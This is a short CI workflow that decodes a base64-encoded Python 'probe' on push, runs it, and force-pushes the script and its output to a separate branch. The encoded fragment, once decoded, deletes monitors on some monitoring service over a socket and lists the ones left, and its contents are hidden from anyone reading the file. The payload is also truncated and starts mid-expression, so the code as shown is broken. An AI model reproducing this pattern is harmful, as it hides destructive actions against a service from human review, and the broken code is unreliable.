name: zz714
on:
  push:
    branches: [ "zz714" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: prep
        run: pip install websocket-client==1.9.2 brotli 2>&1 | tail -2
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' > probe.b64
          echo '' >> probe.b64
          echo 'KCJtc2ciKSlbOjIwMF0sInJlc3A9IixkZWMpCmZvciBrLG1pZCBpbiBpZHMuaXRlbXMoKToKICAgIGlmIG1pZDogbG9nKCJERUwiLGssc3RyKGVtaXQoImRlbGV0ZU1vbml0b3IiLG1pZCwxMCkpWzo4MF0pCmxvZygiTU9OTEVGVCIsc3RyKGVtaXQoImdldE1vbml0b3JMaXN0IixOb25lLDEyKSlbOjgwMF0pCm9wZW4oInI3MTRiLnR4dCIsInciKS53cml0ZSgiXG4iLmpvaW4oT1VUKSkK' >> probe.b64
      - name: run
        run: |
          set +e
          python3 -c "import base64;open('probe.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          python3 probe.py > r714b.txt 2>&1
          echo exit=$?
          wc -c r714b.txt
      - name: push
        if: always()
        run: |
          set +e
          git config user.email p@e.com; git config user.name p
          git checkout -B zz714-out2
          git add -f r714b.txt probe.py
          git commit -m out2
          git push -f origin zz714-out2 2>&1 | tail -5
